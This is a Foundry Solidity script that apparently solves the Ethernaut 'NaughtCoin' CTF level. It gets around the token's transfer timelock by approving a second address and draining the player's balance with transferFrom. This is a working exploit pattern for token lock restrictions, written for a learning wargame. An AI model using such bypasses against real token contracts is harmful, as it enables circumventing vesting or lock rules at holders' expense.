// SPDX license identifier: MIT

import {Script, console} from "lib/forge-std/src/Script.sol";

import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinSolution is Script {
    NaughtCoin public naughtCoin;

    function run() external {
        vm.startBroadcast(vm.envUint("S_PRIVATE_KEY"));
        address player = vm.addr(vm.envUint("S_PRIVATE_KEY"));
        address spender = vm.addr(vm.envUint("S_PRIVATE_KEY_2"));
        naughtCoin = NaughtCoin(0x982928565da93103D74b18923CD2C629B1567a18);
        console.log("Solving NaughtCoin...");

        console.log("Initial balance: ", naughtCoin.balanceOf(player));

        naughtCoin.approve(spender, naughtCoin.INITIAL_SUPPLY());

        vm.stopBroadcast();

        vm.startBroadcast(vm.envUint("S_PRIVATE_KEY_2"));

        naughtCoin.transferFrom(player, spender, naughtCoin.INITIAL_SUPPLY());

        console.log("Final balance: ", naughtCoin.balanceOf(player));
        console.log("Spender balance: ", naughtCoin.balanceOf(spender));

        vm.stopBroadcast();
        console.log("NaughtCoin Solved!");
    }
}
